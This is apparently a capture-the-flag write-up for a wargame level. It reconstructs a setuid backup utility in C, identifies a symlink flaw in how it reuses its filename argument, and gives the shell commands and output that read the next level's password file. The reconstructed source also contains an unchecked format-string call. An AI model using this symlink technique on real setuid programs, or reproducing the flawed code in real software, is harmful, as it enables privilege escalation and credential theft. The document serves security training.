# Level08

## Reconstructed source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

void log_wrapper(FILE *log, char *prefix, char *arg)
{
    char buffer[264];
    strcpy(buffer, prefix);
    snprintf(buffer + strlen(buffer), 254 - strlen(buffer), arg);
    buffer[strcspn(buffer, "\n")] = 0;
    fprintf(log, "LOG: %s\n", buffer);
}

int main(int argc, char **argv)
{
    FILE *log, *src;
    char  path[104];
    int   fd = -1;
    char  c  = -1;

    if (argc != 2)
        printf("Usage: %s filename\n", argv[0]);

    log = fopen("./backups/.log", "w");
    if (!log) { printf("ERROR: Failed to open %s\n", "./backups/.log"); exit(1); }

    log_wrapper(log, "Starting back up: ", argv[1]);

    src = fopen(argv[1], "r");                            // (1) read, with level09's rights
    if (!src) { printf("ERROR: Failed to open %s\n", argv[1]); exit(1); }

    strcpy(path, "./backups/");                           // (2)
    strncat(path, argv[1], 99 - strlen(path));            // (3) dest = "./backups/" + argv[1]

    fd = open(path, O_WRONLY | O_CREAT | O_EXCL, 0660);   // (4) create the destination
    if (fd < 0) { printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]); exit(1); }

    while ((c = fgetc(src)) != EOF)                        // (5) copy source -> destination
        write(fd, &c, 1);

    log_wrapper(log, "Finished back up ", argv[1]);
    fclose(src);
    close(fd);
    return 0;
}
```

The binary is setuid level09. It is a backup utility: given a filename, it
copies that file into `./backups/<filename>`.

## Vulnerability

The same untrusted `argv[1]` is used for two different purposes:

- the **source** that is read, at (1): `fopen(argv[1], "r")`,
- the **destination** that is written, at (3): `"./backups/" + argv[1]`.

The program never checks what `argv[1]` actually points to. A filename can be a
**symbolic link**, and `fopen` follows symlinks. Since the binary is setuid
level09, the source is read **with level09's privileges**. By making `argv[1]` a
symlink to `/home/users/level09/.pass`, the program reads that file for us and
writes a copy we can retrieve.

Two conditions make it work:

- **Flat link name (no `/`).** The destination is `"./backups/" + argv[1]`. If
  `argv[1]` contained slashes, the destination would point at non-existent
  sub-directories (`open` does not create intermediate directories) and fail. A
  flat name like `pass` keeps the destination a direct child of `backups/`.
- **The copy is readable.** The destination file is created with mode `0660`
  (`rw-rw----`). The binary is setuid but **not setgid**, so the file's owner is
  level09 while its group stays level08's group. level08 therefore has group
  `rw` and can read the copy.

## Exploitation

`./backups/` is a **relative** path, resolved against the current working
directory. We run the binary from our own directory so we control `backups/`.

Pitfall: a privileged process refuses to follow a symlink located in a
world-writable directory when the link's owner differs from the effective UID
(Linux `protected_symlinks`). `/tmp` itself is world-writable (`rwxrwxrwt`), so
the link must live in a normal directory; only the inner `backups/` is made
world-writable so level09 can write the copy there.

```sh
mkdir -p /tmp/exploit/backups
chmod 777 /tmp/exploit/backups          # level09 must be able to write the copy
cd /tmp/exploit
ln -s /home/users/level09/.pass pass    # flat symlink -> level09's .pass
/home/users/level08/level08 pass        # reads .pass as level09, copies to ./backups/pass
cat ./backups/pass                       # level09's password
```

Result:

```
level08@OverRide:/tmp/exploit$ /home/users/level08/level08 pass
level08@OverRide:/tmp/exploit$ cat ./backups/pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

